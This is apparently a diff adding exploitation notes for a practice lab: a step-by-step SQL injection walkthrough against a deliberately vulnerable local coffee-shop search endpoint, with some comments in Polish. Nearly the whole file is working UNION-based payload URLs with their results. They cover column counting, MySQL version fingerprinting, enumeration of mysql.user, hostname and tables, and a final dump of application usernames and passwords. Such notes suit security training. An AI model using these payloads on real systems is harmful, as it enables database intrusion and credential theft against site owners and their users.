@@ -1,0 +1,31 @@
+######################################################################
+1. Vulnerability in search functionality because:
+	http://localhost:8080/vuln/injection/search?q=arabica%27%20or%20%271%27=%271 -> ok
+	http://localhost:8080/vuln/injection/search?q=arabica%27%20or%20%271%27=%271%27 -> bad, custom error page
+######################################################################
+2. What is database in back-end?:
+	1. How many column are table? We have to know to UNION:
+		http://localhost:8080/vuln/injection/search?q=arabica%27%20order%20by%2010;%20--%20%27 -> bad, number 10 is too hight
+		http://localhost:8080/vuln/injection/search?q=arabica%27%20order%20by%206;%20--%20%27 -> bad, numer 6 is too hight
+		http://localhost:8080/vuln/injection/search?q=arabica%27%20order%20by%205;%20--%20%27 -> oo, we have 5 column :)
+	2. Fingerprint:
+	 What version:
+		http://localhost:8080/vuln/injection/search?q=arabic%27%20UNION%20all%20select%201,1,%20@@version,1,1;%20--%20%27 -> version is 5.7.17 and host is ubuntu 
+	 What database:
+		http://localhost:8080/vuln/injection/search?q=arabic%27%20UNION%20all%20select%201,1,CONCAT(%27a%27,%27b%27),1,1;%20--%20%27 -> CONCAT z reguly jest w MySQL, wynik to ab
+	 We check database version 5.7.17 and CONCAT function in Google -> oo, we have MySQL :)
+######################################################################
+3. Enumerate data from the database:
+	1. MySQL User Enumeration:
+		http://localhost:8080/vuln/injection/search?q=arabi%27%20UNION%20select%201,1,CONCAT_WS(0x3A,%20User,Host),1,1%20from%20mysql.user;%20--%20%27 -> mysql.sys oraz host: localhost
+		http://localhost:8080/vuln/injection/search?q=arabi%27%20UNION%20select%201,Host,User,1,1%20from%20mysql.user%20%20where%20User%20%3E%20%27mysql.sys%27;%20--%20%27 -> root oraz host:localhost
+		http://localhost:8080/vuln/injection/search?q=arabi%27%20UNION%20select%201,1,@@hostname,1,1%20from%20mysql.user;%20--%20%27 -> hostname: greenhorn
+		http://localhost:8080/vuln/injection/search?q=arabi%27%20UNION%20select%201,1,UUID(),1,1;%20--%20%27 -> MAC address
+		http://localhost:8080/vuln/injection/search?q=arabi%27%20UNION%20select%201,1,database(),1,1;%20--%20%27 -> database name	
+	2. MySQL tables:
+		http://localhost:8080/vuln/injection/search?q=arabic%27%20union%20select%20all%201,table_schema,table_name,1,1%20from%20information_schema.tables%20where%20table_schema%20=%20%27vuln_db%27;%20--%20%27 -> we have first tables
+		http://localhost:8080/vuln/injection/search?q=arabic%27%20union%20select%20all%201,table_schema,table_name,1,1%20from%20information_schema.tables%20where%20table_schema%20=%20%27vuln_db%27%20and%20table_name%20%3E%20%27coffee_product%27;%20--%20%27 -> search another tables
+	3. Web application user:
+		http://localhost:8080/vuln/injection/search?q=arabic%27%20union%20select%201,%20username,password,1,1%20from%20user;%20--%20%27 -> we have user's name and password's
+######################################################################
+
